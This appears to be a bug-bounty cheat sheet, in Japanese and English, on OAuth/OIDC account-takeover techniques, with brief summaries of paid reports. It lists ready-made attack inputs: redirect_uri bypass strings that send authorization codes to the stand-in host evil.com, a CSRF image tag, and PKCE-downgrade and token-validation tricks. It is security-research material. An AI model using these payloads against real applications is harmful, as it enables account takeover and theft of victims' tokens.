OAuth / SSO Advanced Attacks

OAuth 2.0 / OpenID Connectの実装ミスを突くATOテクニック。 TikTok ATO $12,000、GitHub SSH cert bypass $10,000 等、高額報告の定番カテゴリ。

OAuth 2.0 Flow Recap

Authorization Code Flow (最も一般的)

User → App: "Login with Google" App → AuthServer: GET /authorize?response_type=code&client_id=X&redirect_uri=Y&scope=Z&state=S AuthServer: User authenticates + consents AuthServer → App: 302 redirect_uri?code=ABC&state=S App → AuthServer: POST /token { code=ABC, client_secret=SECRET } AuthServer → App: { access_token, refresh_token, id_token }

Implicit Flow (deprecated but still exists)

AuthServer → App: 302 redirect_uri#access_token=TOKEN ↑ Token in URL fragment (never sent to server) Problem: Still accessible via JS, referer leaks

PKCE (Proof Key for Code Exchange)

// Client generates:
code_verifier = random_string(128)
code_challenge = BASE64URL(SHA256(code_verifier))

// Authorization request includes:
&code_challenge=X&code_challenge_method=S256

// Token exchange includes:
&code_verifier=original_verifier
// Server verifies: SHA256(code_verifier) == stored challenge

Attack Vectors

1. Token Theft via Open Redirect

redirect_uriバリデーションの不備を突いてauthorization codeを窃取:

// Strict validation:
redirect_uri=https://app.com/callback  ✓
redirect_uri=https://evil.com/callback  ✗

// Bypass patterns:
redirect_uri=https://app.com/callback/../redirect?url=evil.com  (path traversal)
redirect_uri=https://app.com.evil.com/callback  (subdomain confusion)
redirect_uri=https://app.com/callback%23@evil.com  (fragment injection)
redirect_uri=https://app.com/callback?next=//evil.com  (open redirect chain)
redirect_uri Bypass テクニック集
  • /../ Path traversal
  • %2f%2f Double encoding
  • @evil.com Userinfo prefix
  • \.evil.com Backslash normalization
  • %00 Null byte truncation
  • Same-domain open redirect → chain
  • Subdomain wildcard: *.app.com → find XSS on any subdomain

2. CSRF on Authorization Endpoint

// Attack: Link victim's account to attacker's IdP account
// Attacker starts OAuth flow, gets code, does NOT complete
// Sends code to victim:

<img src="https://target.com/oauth/callback?code=ATTACKER_CODE&state=..." />

// If state parameter is not validated:
// Victim's account is now linked to attacker's Google account
// Attacker can "Login with Google" → access victim's account

3. Scope Escalation

// Original request: scope=read
// Modify to: scope=read+write+admin

// Some IdPs accept broader scope silently
// Or: re-consent prompt with added scope isn't shown to user

4. Account Linking Abuse

「Connect Google Account」機能で別ユーザのアカウントをリンク:

  • CSRFでvictimに攻撃者のOAuthアカウントをリンクさせる
  • Email変更 → OAuth再リンクでATOを永続化
  • 複数IdP間のemail conflictを悪用 (Apple ID vs Google)

5. IdP Confusion (Provider Merge)

// victim@company.com has account via password
// Attacker registers victim@company.com on Google (if not verified)
// Attacker uses "Sign in with Google" on target app
// App matches email → merges into existing account → ATO

// Key: Does the app verify email ownership from IdP?
// Does it distinguish accounts by (provider, provider_id) or just email?

6. PKCE Downgrade

// If server supports both PKCE and non-PKCE flows:
// Simply omit code_challenge from authorization request
// If server doesn't enforce PKCE → code interception is possible again

// Or: code_challenge_method=plain (server accepts plain instead of S256)
// code_verifier = code_challenge (no hashing → attacker can guess)

OIDC-Specific Attacks

ID Token Validation Issues

  • Signature not verified: id_tokenのJWS署名検証がない → 改竄可能
  • Algorithm confusion: RS256→HS256切り替え (JWT attack)
  • aud claim not checked: 別appのid_tokenを流用
  • iss claim not checked: 別IdPのtokenを受理

Nonce Replay

// id_token contains nonce claim to prevent replay
// If app doesn't verify nonce:
// Attacker replays stolen id_token → authenticated as victim

Issuer Confusion

// App trusts multiple IdPs
// Attacker's IdP issues token with sub=victim_id
// App doesn't scope (issuer + sub) → matches victim's account

Real-World Reports

TikTok ATO via Account Recovery - #2443228 ($12,000)

TikTokのアカウントリカバリーフローでOAuth tokenが適切にscopeされておらず、 攻撃者がvictimのアカウントを完全に乗っ取り可能。 認証フローの状態管理の欠陥を突いた典型的なOAuth ATO。

GitHub SSH Certificate Bypass - #1901040 ($10,000)

GitHub Enterprise CloudのSSO/OAuth認証フローにおいて、 SSH certificate authenticationでSAMLバリデーションをbypass。 組織メンバーの認証ポリシーを回避してリポジトリアクセスを取得。

Reddit: Apple Sign-In XSS Chain

Apple Sign-InのレスポンスをXSSで窃取し、 Redditアカウントの完全乗っ取りを達成。 OAuth response + XSSのクラシックなchain。
